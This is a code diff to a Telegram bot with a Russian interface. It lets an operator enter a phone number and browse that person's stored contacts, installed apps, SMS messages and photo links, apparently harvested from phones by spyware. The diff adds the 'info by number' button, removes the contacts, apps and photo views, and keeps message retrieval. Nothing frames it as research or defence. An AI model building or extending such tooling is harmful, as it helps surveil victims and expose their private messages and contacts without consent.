@@ -7,7 +7,7 @@ const server = require('./requests/Server')
 const main_keyboard = {
     reply_markup: {
         keyboard: [
-            [{ text: 'Просмотреть отработанные номера' }],
+            [{ text: 'Просмотреть отработанные номера' }, { text: 'Инфа по номеру' }],
         ],
         resize_keyboard: true,
     }
@@ -124,33 +124,9 @@ bot.onText(/Инфа по номеру/, async (msg) => {
             bot.once('message', async (msg) => {
                 const phoneNumber = msg.text;
                 const userdataByPhone = await server.getUserData(phoneNumber);
-                console.log(userdataByPhone)
                 const databtns = []
-                var appMessages = ''
-                var contactMessages = ''
                 var messageMessages = ''
-                var photosMessages = ''
                 if (userdataByPhone.data != 'Данные пользователя не найдены') {
-                    if (userdataByPhone.data?.userContacts[0]) {
-                        if (userdataByPhone.data.userContacts[0].contacts.length > 0) {
-                            contactMessages = userdataByPhone.data.userContacts[0].contacts.map(element => {
-                                const name = `Имя: ${element.givenName}`;
-                                const phones = `Номера: ${element.phoneNumbers.map(phone => phone.number).join(', ')}`;
-                                return `Телефонная книга\n${name}\n${phones}`;
-                            });
-                            databtns.push({ text: "Контакты", callback_data: "Sendcontacts" })
-                        }
-                    }
-                    if (userdataByPhone.data?.userApps[0]) {
-                        if (userdataByPhone.data.userApps[0].apps.length > 0) {
-                            appMessages = userdataByPhone.data.userApps[0].apps.map(element => {
-                                const label = `Название: ${element.label}`;
-                                const packageName = `Название пакета: ${element.packageName}`;
-                                return `${label}\n${packageName}`;
-                            });
-                            databtns.push({ text: "Приложения", callback_data: "Sendapps" })
-                        }
-                    }
                     if (userdataByPhone.data?.userMessages[0]) {
                         if (userdataByPhone.data.userMessages[0].messages.length > 0) {
                             messageMessages = userdataByPhone.data.userMessages[0].messages.map(element => {
@@ -162,15 +138,6 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                             databtns.push({ text: "Сообщения", callback_data: "Sendmessages" });
                         }
                     }
-                    if (userdataByPhone.data?.userPhotos[0]) {
-                        if (userdataByPhone.data.userPhotos[0].urls.length > 0) {
-                            photosMessages = userdataByPhone.data.userPhotos[0].urls.map(element => {
-                                const body = `Ссылка: ${element}`;
-                                return `${body}`;
-                            });
-                            databtns.push({ text: "Фотки", callback_data: "Sendimages" });
-                        }
-                    }
                     const message = await bot.sendMessage(chatId, "Выберите данные", {
                         parse_mode: 'HTML',
                         reply_markup: {
@@ -179,25 +146,11 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                             ]
                         }
                     })
-                    const messagesToSendcontact = contactMessages;
-                    const pageSizecontact = 7;
-                    const totalPagescontact = Math.ceil(messagesToSendcontact.length / pageSizecontact);
-                    let currentPagecontact = 1;
-
-                    const messagesToSendapp = appMessages;
-                    const pageSizeapp = 7;
-                    const totalPagesapp = Math.ceil(messagesToSendapp.length / pageSizeapp);
-                    let currentPageapp = 1;
-
+                    
                     const messagesToSendmessage = messageMessages;
                     const pageSizemessage = 7;
                     const totalPagesmessage = Math.ceil(messagesToSendmessage.length / pageSizemessage);
                     let currentPagemessage = 1;
-
-                    const messagesToSendimage = photosMessages;
-                    const pageSizeimage = 10;
-                    const totalPagesimage = Math.ceil(messagesToSendimage.length / pageSizeimage);
-                    let currentPageimage = 1;
 
                     let currentMessageId = null;
                     let paginationMessageId = null;
